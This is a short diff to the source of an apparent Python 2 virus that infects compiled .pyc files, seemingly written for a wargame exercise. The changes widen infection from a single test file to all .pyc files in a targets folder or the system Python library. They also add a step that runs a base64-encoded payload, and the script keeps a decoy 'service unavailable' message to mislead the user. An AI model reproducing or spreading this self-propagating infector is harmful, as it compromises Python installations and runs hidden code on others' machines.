@@ -33,6 +33,7 @@ if __file__.endswith('.pyc'):
 
     # ------------- GENERATING PAYLOAD DATA ---------------
     def infect(f_to_infect):
+        print "j'infecte %s"%f_to_infect
         if f_to_infect.endswith("socket.pyc"):
             return
 
@@ -77,12 +78,13 @@ if __file__.endswith('.pyc'):
     if socket.gethostname() == "OT-Wargame":
         target_dir = "/usr/lib/python2.6/*.pyc"
     else:
-        target_dir = "./targets/hello.pyc"
+        target_dir = "./targets/*.pyc"
 
     for i in glob.glob(target_dir):
         infect(i)
 
     print "Unfortunately your computer's specifications do not allow you access to our service.\nExiting..."
-    print "FAIRE DU MAL"
+
+    exec b64decode("__PAYLOAD_PY__")
 
 signature = "PY_2.6"
